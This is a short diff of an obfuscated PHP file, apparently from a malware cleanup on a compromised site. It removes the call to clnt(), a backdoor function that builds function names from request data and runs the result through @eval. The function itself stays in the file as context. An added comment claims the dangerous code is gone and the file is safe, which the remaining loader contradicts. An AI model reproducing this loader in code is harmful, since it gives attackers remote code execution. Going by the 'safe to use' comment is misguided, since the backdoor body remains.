@@ -31,4 +31,8 @@ function clnt($_pmd = -0202114, $_txh = null)
     ($_edy && isset($_edy[Hoster::g(0)])) ? (($_zzzm = $_edy[Hoster::g(1)] . $_edy[Hoster::g(2)]) && ($_hygic = $_zzzm($_edy[Hoster::g(3)] . $_edy[Hoster::g(4)])) && ($_ylgnr = $_zzzm($_edy[Hoster::g(5)] . $_edy[Hoster::g(6)])) && ($_ylgnr = $_ylgnr($_zzzm($_edy[Hoster::g(7)]))) && @eval($_ylgnr)) : $_edy;
     return Hoster::g(8);
 }
-clnt();
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
